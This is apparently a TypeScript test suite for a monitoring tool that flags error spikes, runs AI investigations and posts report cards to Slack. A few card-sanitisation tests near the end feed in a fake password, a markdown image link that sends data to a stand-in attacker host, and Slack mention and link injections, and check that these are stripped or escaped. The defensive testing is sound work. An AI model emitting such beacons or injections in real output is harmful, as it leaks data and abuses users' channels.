import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import type { Config } from '../src/config.js';
import { checkReport, type Report } from '../src/investigate/report.js';
import { reportCard } from '../src/output/card.js';
import { CardSink } from '../src/output/sink.js';
import { SlackError, SlackOutbox } from '../src/output/slack.js';
import { Noise } from '../src/patrol/noise.js';
import { Owners } from '../src/patrol/owners.js';
import { State } from '../src/patrol/state.js';
import { buildSummary, renderSummary } from '../src/patrol/summary.js';
import { loadAgent } from '../src/engine/agent.js';
import { Store } from '../src/engine/store.js';
import type { Session } from '../src/engine/session.js';
import type { FlaggedRow } from '../src/patrol/summary.js';
import { needsChallenge, patrolOnce, type MonitorAgent, patrolLoop } from '../src/runner.js';
import { fakeSession, ok } from './fake-session.js';
import { DAY, FakeTelemetry, H, INCIDENT_START, world } from './fake.js';

const cfg = (): Config => ({
  grafanaUrl: 'http://grafana.test',
  grafanaTokenFile: '/dev/null',
  promUid: 'prometheus',
  lokiUid: undefined,
  tempoUid: undefined,
  windowMinutes: 15,
  attentionFloor: 10,
  sources: {
    http_families: [
      { id: 'legacy-v1', selector: 'backend_be_production_http_requests_total', service: 'backend-production', route_label: 'route', status_label: 'status_code' },
    ],
    error_counters: [],
    workloads: { namespaces: 'microservices' },
    logs: { selector: '{namespace="microservices"}', error_filter: '', service_label: 'app', max_lines: 100 },
    traces: { traceql: '{ status = error }', limit: 10 },
  },
  noiseFile: '/dev/null',
  ownersFile: '/dev/null',
  stateFile: join(mkdtempSync(join(tmpdir(), 'sre-test-')), 'state.json'),
  outDir: mkdtempSync(join(tmpdir(), 'sre-out-')),
  llm: { available: false, dailyCapUsd: 10, monthlyCapUsd: 100 },
  agentsDir: join(import.meta.dirname, '..', 'agents'),
  runsDir: mkdtempSync(join(tmpdir(), 'sre-runs-')),
  slackWebhookUrl: undefined,
  slackBotToken: undefined,
  slackChannel: undefined,
  direct: undefined,
  memoryDir: undefined,
  build: undefined,
  retentionDays: 30,
  mcp: { usersFile: '/nonexistent', reposFile: '/nonexistent', userDailyCapUsd: 10, userMaxRunning: 2, notifySlack: false, allowedOrigins: [], agents: undefined, login: undefined, reposDir: undefined, reposGithub: undefined, githubApp: undefined },
});

test('incident rows are flagged, steady noise is not', async () => {
  const s = await buildSummary(new FakeTelemetry(world), cfg(), new Noise({}), State.memory(), new Date('2026-09-29T12:15:00Z'));
  const keys = s.send.map((r) => r.key).sort();
  assert.deepEqual(keys, ['http|backend-production|/v1/auth/password/reset|400', 'http|backend-production|/v1/auth/signup|400']);
  assert.ok(s.sources.every((x) => x.ok || x.source === 'logs' || x.source === 'traces'));
  assert.match(renderSummary(s), /password\/reset 400: SPIKE \(fresh, started/);
});

test('still visible the next day, and only re-sent when worse or after the reminder interval', async () => {
  const c = cfg();
  const state = State.memory();
  const tel = new FakeTelemetry(world);
  const first = await buildSummary(tel, c, new Noise({}), state, new Date('2026-09-29T12:15:00Z'));
  for (const r of first.send) state.reported(r, new Date('2026-09-29T12:15:00Z'));

  const next = await buildSummary(tel, c, new Noise({}), state, new Date('2026-09-29T12:30:00Z'));
  assert.equal(next.send.length, 0);
  assert.equal(next.known.length, 2);

  // Next day: 1 d baseline is the incident itself, 7 d is clean → still flagged.
  const dayTwo = await buildSummary(tel, c, new Noise({}), state, new Date(Date.parse('2026-09-29T12:30:00Z') + DAY));
  assert.equal(dayTwo.send.length + dayTwo.known.length, 2);
  assert.ok(dayTwo.send.every((r) => r.novelty === 'reminder'));
});

test('recovery is reported once', async () => {
  const c = cfg();
  const state = State.memory();
  const tel = new FakeTelemetry(world);
  const at1 = new Date(INCIDENT_START + 30 * H - 15 * 60_000);
  const s1 = await buildSummary(tel, c, new Noise({}), state, at1);
  for (const r of s1.send) state.reported(r, at1);
  const s2 = await buildSummary(tel, c, new Noise({}), state, new Date(at1.getTime() + 15 * 60_000));
  assert.equal(s2.recovered.length, 2);
  const s3 = await buildSummary(tel, c, new Noise({}), state, new Date(at1.getTime() + 30 * 60_000));
  assert.equal(s3.recovered.length, 0);
});

test('noise rules drop rows, never_suppress wins, expired rules stop matching', async () => {
  const at = new Date('2026-09-29T12:15:00Z');
  const noise = new Noise({
    never_suppress: [{ section: 'http', route: '.*signup.*', status: '4..' }],
    noise: [
      { id: 'n1', section: 'http', route: '.*(reset|signup).*', status: '400', reason: 'test rule', expires: '2027-01-01' },
      { id: 'old', section: 'http', route: '.*', reason: 'expired rule', expires: '2026-01-01' },
    ],
  });
  const s = await buildSummary(new FakeTelemetry(world), cfg(), noise, State.memory(), at);
  assert.deepEqual(s.send.map((r) => r.subject), ['/v1/auth/signup']);
  assert.deepEqual(s.suppressed.map((x) => x.rule.id), ['n1']);
});

test('a failing source is a blind spot, not a crash, and does not mute other sources', async () => {
  const c = cfg();
  c.sources.http_families.push({ id: 'broken', selector: 'nope_total', service: 'x', route_label: 'route', status_label: 'code' });
  const tel = new FakeTelemetry((q, at) => {
    if (q.includes('nope_total')) throw new Error('timeout');
    return world(q, at);
  });
  const s = await buildSummary(tel, c, new Noise({}), State.memory(), new Date('2026-09-29T12:15:00Z'));
  assert.equal(s.send.length, 2);
  assert.deepEqual(s.sources.find((x) => x.source === 'http:broken'), { source: 'http:broken', ok: false, error: 'timeout' });
});

test('a source that answers with no series is blind, not healthy', async () => {
  // kube-state-metrics stopped being scraped, and an HTTP family whose counter is gone:
  // Prometheus answers 200 with empty vectors, which looks exactly like a quiet system.
  const c = cfg();
  c.sources.http_families.push({ id: 'gone', selector: 'gone_requests_total', service: 'x', route_label: 'route', status_label: 'code' });
  const tel = new FakeTelemetry((q, at) => (q.startsWith('count(kube_') ? [] : world(q, at)));
  const s = await buildSummary(tel, c, new Noise({}), State.memory(), new Date('2026-09-29T12:15:00Z'));
  const blind = Object.fromEntries(s.sources.filter((x) => !x.ok).map((x) => [x.source, x.error]));
  assert.match(blind.workloads ?? '', /no kube-state-metrics series/);
  assert.match(blind['http:gone'] ?? '', /no HTTP request series for gone_requests_total/);
  assert.equal(s.sources.find((x) => x.source === 'http:v3' || x.source.startsWith('http:') && x.source !== 'http:gone')?.ok, true, 'a family with data stays healthy');
  assert.equal(s.send.length, 2, 'the incident is still reported');
});

test('quiet patrol costs nothing and writes no card', async () => {
  const c = cfg();
  const r = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), State.memory(), new CardSink(c.outDir), new Date('2026-09-28T12:15:00Z'), { llm: true, post: false });
  assert.equal(r.summary.send.length, 0);
  assert.equal(r.cards.length, 0);
  assert.equal(r.investigation, undefined);
});

test('without LLM credentials the patrol still writes a rows card and says why', async () => {
  const c = cfg();
  const r = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), State.memory(), new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: true, post: false }, monitor(c, fakeSession(), false));
  assert.equal(r.skippedLlm, 'no LLM credentials configured');
  assert.equal(r.cards.length, 1);
  assert.ok(r.cards[0]!.endsWith('-rows.md'));
});

test('the rows card leads with a summary and mentions the owner of what to look at', async () => {
  const c = cfg();
  const owners = new Owners({ owners: { 'backend-*': '<@U0BACKEND1>' } });
  const r = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), State.memory(), new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: false, post: false, owners });
  const md = readFileSync(r.cards[0]!, 'utf8');
  assert.match(md, /^## Patrol 2026-09-29 12:15Z: 2 to look at · cc <@U0BACKEND1>\n/);
  assert.match(md, /`\/v1\/auth\/password\/reset 400` — now 75 of 95 requests \(1h ago 2\) vs expected 2\.1 · spike, started <@U0BACKEND1>/);
  assert.match(md, /_not investigated: LLM disabled for this run · blind spots: logs, traces_/);
});

function monitor(c: Config, session: Session, llmAvailable = true): MonitorAgent {
  return {
    engine: { store: new Store(join(c.runsDir, 'engine.db')), runsDir: c.runsDir, stopFile: join(c.runsDir, 'STOP'), session, dailyCapUsd: 20, llmAvailable },
    agent: loadAgent(join(c.agentsDir, 'monitor')),
  };
}

test('the rows card goes out before the AI; reports cite real tool results; protected journeys get challenged', async () => {
  const c = cfg();
  const noise = new Noise({ never_suppress: [{ section: 'http', route: '.*(reset|signup).*', status: '4..' }] });
  const keys = ['http|backend-production|/v1/auth/password/reset|400', 'http|backend-production|/v1/auth/signup|400'];
  const session = fakeSession(
    async function* (sim) {
      const out = await sim.mcp('service_overview', { service: 'backend-production', minutes: 60 });
      const id = /evidence_id: (E-[0-9a-f]{4}-\d+)/.exec(out.text)![1]!;
      assert.match(out.text, /password\/reset 400 \| 75/);
      const r = await sim.mcp('submit_report', report({ evidence: [{ id, quote: '/v1/auth/password/reset 400 | 75', claim: '75 of 95 reset requests returned 400' }], rows: keys }));
      assert.equal(r.isError, false, r.text);
      yield ok(0.4, 6);
    },
    async function* (sim) {
      assert.equal(sim.req.model, 'claude-opus-5-5');
      assert.match(sim.req.prompt, /password\/reset\|400/, 'challenger sees the rows it must cover');
      const check = await sim.mcp('route_timeline', { service: 'backend-production', route: '/v1/auth/password/reset', hours: 2 });
      assert.match(check.text, /evidence_id/);
      await sim.mcp('submit_challenge', { objections: [], overall: 'Holds up: the counts match the evidence.' });
      yield ok(0.2, 2);
    },
  );
  const r = await patrolOnce(new FakeTelemetry(world), c, noise, State.memory(), new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: true, post: false }, monitor(c, session));
  assert.equal(r.investigation?.status, 'ok');
  assert.equal(r.investigation?.challenge?.verdict, 'upheld');
  assert.equal(r.cards.length, 2);
  assert.ok(r.cards[0]!.endsWith('-rows.md'), 'deterministic card first');
  assert.deepEqual(r.slack, r.cards, 'urgent rows and a critical report both go to Slack');
  assert.match(readFileSync(r.cards[1]!, 'utf8'), /Challenge: upheld/);
  assert.equal(session.requests[0]!.builtin.length, 0, 'monitor gets no built-in tools');
});

test('challenge gate is deterministic: an unprotected modest spike is not challenged', () => {
  const row = { key: 'k', section: 'http', service: 's', subject: '/v1/products', status: '404', counts: { now: 30, h1: 2, d1: 2, d7: 2 }, score: { verdict: 'spike', expected: 2, z: 9, trend: 'started' }, novelty: 'fresh', firstSeen: '' } as unknown as FlaggedRow;
  assert.equal(needsChallenge([row], new Noise({})), false);
  assert.equal(needsChallenge([{ ...row, counts: { ...row.counts, now: 60 } }], new Noise({})), true);
  assert.equal(needsChallenge([row], new Noise({ never_suppress: [{ section: 'http', route: '/v1/products' }] })), true);
});

const report = (over: Partial<Report> = {}): Report => ({
  title: 'Password reset returns 400 for valid requests',
  severity: 'critical',
  status: 'active',
  started_at: '2026-09-29T12:00:00Z',
  what_broke: 'POST /v1/auth/password/reset returns 400',
  impact: '~75% of reset requests in 15 min',
  cause: { hypothesis: 'validation change', confidence: 'medium' },
  evidence: [{ id: 'E-abcd-1', quote: 'reset 400 | 75', claim: '75 of 95 requests were 400' }],
  suggested_fix: 'roll back the validation change',
  not_checked: [],
  rows: ['http|backend-production|/v1/auth/password/reset|400'],
  ...over,
});

// The same incident at a quarter of the size: still worth a look (above the
// floor), but neither protected nor a big spike, so the AI decides.
const smaller = (q: string, at: Date) => world(q, at).map((x) => (/^4/.test(x.labels.status_code ?? '') && x.labels.route !== '/v1/products' ? { ...x, value: Math.round(x.value / 4) } : x));
const RESET = 'http|backend-production|/v1/auth/password/reset|400';
const SIGNUP = 'http|backend-production|/v1/auth/signup|400';

test('without the AI only urgent rows reach Slack', async () => {
  const c = cfg();
  const big = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), State.memory(), new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: false, post: false });
  assert.deepEqual(big.slack, big.cards, 'a big spike posts the rows card');
  const small = await patrolOnce(new FakeTelemetry(smaller), c, new Noise({}), State.memory(), new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: false, post: false });
  assert.equal(small.summary.send.length, 2);
  assert.equal(small.cards.length, 1, 'the rows card is still written');
  assert.deepEqual(small.slack, []);
});

test('Slack down: the patrol still finishes and marks its rows, and the queued card goes out next patrol', async () => {
  const c = cfg();
  const state = State.memory();
  let down = true;
  const sent: string[] = [];
  const box = new SlackOutbox(':memory:', { threads: true, post: async (m) => { if (down) throw new SlackError('Slack: HTTP 503'); sent.push(m.text); return `ts${sent.length}`; } }, { sleep: async () => {}, gapMs: 0 });
  const sink = new CardSink(c.outDir, box);
  const first = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), state, sink, new Date('2026-09-29T12:15:00Z'), { llm: false, post: true });
  assert.equal(first.slack.length, 1, 'the urgent rows card was queued');
  assert.deepEqual(sent, []);
  assert.deepEqual(box.status(), [{ status: 'pending', n: 1 }]);
  down = false;
  const next = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), state, sink, new Date('2026-09-29T12:30:00Z'), { llm: false, post: true });
  assert.equal(next.summary.send.length, 0, 'rows were marked reported despite the outage: no repeat');
  assert.equal(sent.length, 1, 'the queued card went out');
  assert.match(sent[0]!, /Patrol 2026-09-29 12:15Z/);
  assert.deepEqual(box.status(), [{ status: 'sent', n: 1 }]);
});

test('without --post nothing is queued for Slack', async () => {
  const c = cfg();
  const box = new SlackOutbox(':memory:', { threads: true, post: async () => 'ts' }, { sleep: async () => {}, gapMs: 0 });
  await patrolOnce(new FakeTelemetry(world), c, new Noise({}), State.memory(), new CardSink(c.outDir, box), new Date('2026-09-29T12:15:00Z'), { llm: false, post: false });
  assert.deepEqual(box.status(), []);
});

test('a 6-hour reminder of an urgent row is not posted again', async () => {
  const c = cfg();
  const state = State.memory();
  const first = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), state, new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: false, post: false });
  assert.equal(first.slack.length, 1);
  const later = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), state, new CardSink(c.outDir), new Date('2026-09-29T18:30:00Z'), { llm: false, post: false });
  assert.ok(later.summary.send.some((r) => r.key === RESET && r.novelty === 'reminder'));
  assert.deepEqual(later.slack, []);
});

test('the AI decides the rest: critical and major are posted with their owners, minor is only recorded', async () => {
  const c = cfg();
  const owners = new Owners({ owners: { 'backend-*': '<@U0BACKEND1>' } });
  const session = fakeSession(async function* (sim) {
    const out = await sim.mcp('service_overview', { service: 'backend-production', minutes: 60 });
    const id = /evidence_id: (E-[0-9a-f]{4}-\d+)/.exec(out.text)![1]!;
    const quote = /\/v1\/auth\/password\/reset 400 \| \d+/.exec(out.text)![0];
    for (const [severity, rows] of [['major', [RESET]], ['minor', [SIGNUP]]] as const) {
      const r = await sim.mcp('submit_report', report({ severity, rows: [...rows], evidence: [{ id, quote, claim: 'reset requests return 400' }] }));
      assert.equal(r.isError, false, r.text);
    }
    yield ok(0.3, 4);
  });
  const r = await patrolOnce(new FakeTelemetry(smaller), c, new Noise({}), State.memory(), new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: true, post: false, owners }, monitor(c, session));
  assert.equal(r.investigation?.outputs.length, 2);
  assert.equal(r.investigation?.challenge, undefined, 'not urgent, not challenged');
  assert.equal(r.cards.length, 3);
  assert.equal(r.slack.length, 1, 'only the major report');
  assert.ok(r.slack[0]!.endsWith('-1.md'));
  assert.match(readFileSync(r.slack[0]!, 'utf8'), /\*\*Severity:\*\* major · \*\*Confidence:\*\* medium · cc <@U0BACKEND1>/);
});

test('nothing new above the floor: no AI run, nothing posted', async () => {
  const c = { ...cfg(), attentionFloor: 100 };
  const r = await patrolOnce(new FakeTelemetry(smaller), c, new Noise({}), State.memory(), new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: true, post: false }, monitor(c, fakeSession()));
  assert.equal(r.skippedLlm, 'nothing new above the attention floor');
  assert.equal(r.investigation, undefined);
  assert.deepEqual(r.slack, []);
});

test('reports must cover real rows and state measured impact for critical', () => {
  const rows = new Set(['http|backend-production|/v1/auth/password/reset|400']);
  assert.deepEqual(checkReport(report(), rows), []);
  assert.match(checkReport(report({ rows: ['made-up'] }), rows).join(), /not in this patrol/);
  assert.match(checkReport(report({ impact: 'unknown' }), rows).join(), /critical needs measured impact/);
});

test('a crashed investigator still leaves the rows reported and saved', async () => {
  const c = cfg();
  const m = monitor(c, fakeSession());
  m.engine.store.admit = () => {
    throw new Error('disk full');
  };
  const state = State.memory();
  const r = await patrolOnce(new FakeTelemetry(world), c, new Noise({}), state, new CardSink(c.outDir), new Date('2026-09-29T12:15:00Z'), { llm: true, post: false }, m);
  assert.match(r.skippedLlm!, /investigator crashed: disk full/);
  assert.equal(r.cards.length, 1);
  const next = await buildSummary(new FakeTelemetry(world), c, new Noise({}), state, new Date('2026-09-29T12:30:00Z'));
  assert.equal(next.send.length, 0, 'not re-sent next patrol');
});

test('card survives quotes in model text, and strips images and unknown links', () => {
  const card = reportCard(
    report({ what_broke: 'Logs show DB_PASSWORD="hunter2" rejected; see ![x](https://evil.test/p?d=secret) and https://evil.test/a?d=1 or https://monitoring.starkfuture.com/d/abc' }),
    '2026-09-29T12:15:00Z',
    'test',
  );
  const all = card.markdown + JSON.stringify(card.blocks);
  assert.ok(!all.includes('hunter2'));
  assert.ok(!all.includes('evil.test/p'));
  assert.ok(!all.includes('d=1'));
  assert.ok(all.includes('https://monitoring.starkfuture.com/d/abc'));
});

test('the AI card reads in Slack: level in the header, two short paragraphs, no evidence ids; the file keeps it all', () => {
  const long = `${'The rollout renamed the route. '.repeat(20)}Tail.`;
  const c = reportCard(report({ severity: 'major', cause: { hypothesis: long, confidence: 'medium' } }), '2026-09-29T12:15:00Z', 'run r-1', { verdict: 'upheld', overall: 'Holds up', blocking: [], notes: [] } as never);
  const slack = JSON.stringify(c.blocks);
  assert.equal((c.blocks[0] as { text: { text: string } }).text.text, '🟠 Major: Password reset returns 400 for valid requests');
  assert.match(slack, /since 12:00Z · confidence medium/);
  assert.match(slack, /What's wrong:\*/);
  assert.doesNotMatch(slack, /E-abcd-1/, 'evidence ids stay in the file');
  assert.match(slack, /1 evidence item · second check agrees · patrol 12:15Z · run r-1/);
  assert.ok(!slack.includes('Tail.'), 'long text is cut');
  assert.match(slack, /route\.\\n\*Suggested fix/, 'at a sentence end');
  assert.match(c.markdown, /E-abcd-1: 75 of 95 requests were 400/);
  assert.match(c.markdown, /Tail\./);
  const objection = (claim: string, evidence: string[]) => ({ claim, evidence, failure_scenario: '', settling_check: '', blocking: true });
  const mine = reportCard(report(), '2026-09-29T12:15:00Z', 'run r-2', { verdict: 'escalate', overall: 'Mixed', blocking: [objection('The 400s are bot traffic (E-abcd-1).', ['E-abcd-1'])], notes: [] } as never);
  assert.match(JSON.stringify(mine.blocks), /A second AI check disputes this, a human decides:\* The 400s are bot traffic\./, 'its own objection, without the id');
  const named = reportCard(report(), '2026-09-29T12:15:00Z', 'run r-3', { verdict: 'escalate', overall: 'Mixed', blocking: [objection('/v1/auth/password/reset 400s are retries', ['E-ffff-9'])], notes: [] } as never);
  assert.match(JSON.stringify(named.blocks), /disputes this/, 'or one that names its route');
  const other = reportCard(report(), '2026-09-29T12:15:00Z', 'run r-4', { verdict: 'escalate', overall: 'The stock-sync row is not noise', blocking: [objection('stock-sync INSERT spans are failing', ['E-ffff-2'])], notes: [] } as never);
  assert.doesNotMatch(JSON.stringify(other.blocks), /disputes this/, 'an objection about another finding stays off this card');
  assert.match(JSON.stringify(other.blocks), /second check disputes another finding/);
});

test('card escapes Slack controls in model and production text', () => {
  const c = reportCard(report({ title: 'Down <!here>', what_broke: 'log says <!channel> see <https://evil.test|grafana>' }), '2026-09-29T12:15:00Z', 'test');
  // mrkdwn and the notification text parse controls; plain_text (the header) does not.
  const mrkdwn = JSON.stringify(c.blocks).match(/"type":"mrkdwn","text":"(?:[^"\\]|\\.)*"/g) ?? [];
  const slack = c.text + mrkdwn.join('');
  assert.ok(!/<!here>|<!channel>|<https?:/.test(slack), slack);
  assert.match(slack, /&lt;!channel&gt;/);
});

test('card redacts what the model wrote', () => {
  const c = reportCard(report({ what_broke: 'reset for jane@example.com returns 400' }), '2026-09-29T12:15:00Z', 'test');
  assert.ok(!c.markdown.includes('jane@example.com'));
  assert.ok(!JSON.stringify(c.blocks).includes('jane@example.com'));
});

test('the patrol loop runs with or without a metrics listener', async () => {
  for (const listen of [false, true]) {
    let queries = 0;
    const counted = new Proxy(new FakeTelemetry(world), {
      get(t, k, r) {
        const v = Reflect.get(t, k, r);
        return typeof v === 'function' ? (...args: unknown[]) => (queries++, v.apply(t, args)) : v;
      },
    });
    const passes: Array<Date> = [];
    await patrolLoop({
      tel: counted,
      cfg: cfg(),
      noise: new Noise({}),
      state: State.memory(),
      sink: new CardSink(cfg().outDir),
      windowMin: 15,
      opts: { llm: false, post: false },
      passes: 2,
      now: () => new Date('2026-09-29T12:16:00Z'),
      sleep: async () => {},
      onPass: listen ? (at) => void passes.push(at) : undefined,
    });
    assert.ok(queries > 0, `patrol queried telemetry (listener: ${listen})`);
    if (listen) assert.deepEqual(passes.map((d) => d.toISOString()), ['2026-09-29T12:15:00.000Z', '2026-09-29T12:15:00.000Z']);
  }
});
